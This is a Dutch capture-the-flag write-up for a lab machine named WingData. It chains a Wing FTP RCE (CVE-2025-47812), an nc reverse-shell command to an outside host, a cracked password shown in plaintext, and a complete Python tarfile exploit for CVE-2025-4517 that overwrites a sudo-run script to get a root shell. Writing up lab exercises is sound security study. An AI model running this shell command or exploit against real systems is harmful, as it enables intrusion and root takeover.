# WingData

Met ffuf ontdekken we al snel dat er een ftp.wingdata.htb subdomein is waar een
verouderde `wingftp` draait. Eentje die vatbaar is voor CVE-2025-47812. Met een
poc hebben we hiermee een RCE te pakken.

Een aantal revshells werken niet maar met `python poc.py -c 'nc 10.10.10.10 -e
/bin/bash'` krijgen we een revshell.

# Password cracking

In `Data/1/users.xml` zijn een aantal users te vinden waaronder ook een user
genaamd `Wacky` die ook in `/etc/passwd` staat. Volgens de `WingFTP`
[handleiding](https://www.wftpserver.com/help/ftpserver/index.html?administration.htm)
moeten we een salt toevoegen met daarin `WingFTP`. Hiermee krijgen we het
password van de `wacky` user. En ook SSH toegang.

```shell
# hash.txt
# wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

hashcat.txt \
    hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt \
    --username \
    -m 1410 \
    --show
```

# Privesc

Er is een sudo command dat uitgevoerd kan worden die iets met python en tarfiles
doet. Nu staat hier een `tar.extractall(path=..., filter="data")`. Met wat
rondzoeken kom ik op
[CVE-2025-4138](https://github.com/advisories/GHSA-4g4g-fqw4-prp2) uit. Nu nog
uitzoeken hoe dit the exploiteren is.

Met onderzoek kom ik wel meer CVE's tegen in deze module zoals:

- CVE-2025-4517
- CVE-2024-12718 (_valt af, alleen timestamp modificatie_)
- CVE-2025-4330

# CVE-2025-4517

Uiteindelijk opgelost met deze CVE. Hierbij heb ik [dit
script](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f)
aangepast om het python bestand om de backups te maken te overschrijven. Omdat
ik dit bestand met `sudo` mag uitvoeren kon ik een `import pty;
pty.spawn("/bin/bash")` er in zetten waarna een bash als root opgestart kon
worden, en er dus een privesc was.

Ter referentie het uiteindelijke script dat gebruikt is:

```python
import tarfile
import os
import io
import sys
# 247 (55 on OSX) picked so the expanded path of dirs is 3968 bytes long (or 896
# on OSX), leaving 128 bytes for a prefix and at least a few chars of the link
comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("poc.tar", mode="x") as tar:
    # populate the symlinks and dirs that expand in os.path.realpath()
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    # create the final symlink that exceeds PATH_MAX and simply points to the
    # top dir. this allows *any* path to be appended.
    # this link will never be expanded by os.path.realpath(), nor anything after it.
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)

    # make a symlink outside to keep the tar command happy
    e = tarfile.TarInfo("escape/flag")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../restore_backup_clients.py"
    tar.addfile(e)

    # use the symlinks above, that are not checked, to create a hardlink
    # to a file outside of the destination path
    f = tarfile.TarInfo("pylink")
    f.type = tarfile.LNKTYPE
    f.linkname =  "escape/flag"
    tar.addfile(f)

    # now that we have the hardlink we can overwrite the file
    content = b"import pty;pty.spawn('/bin/bash')"
    c = tarfile.TarInfo("pylink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
```
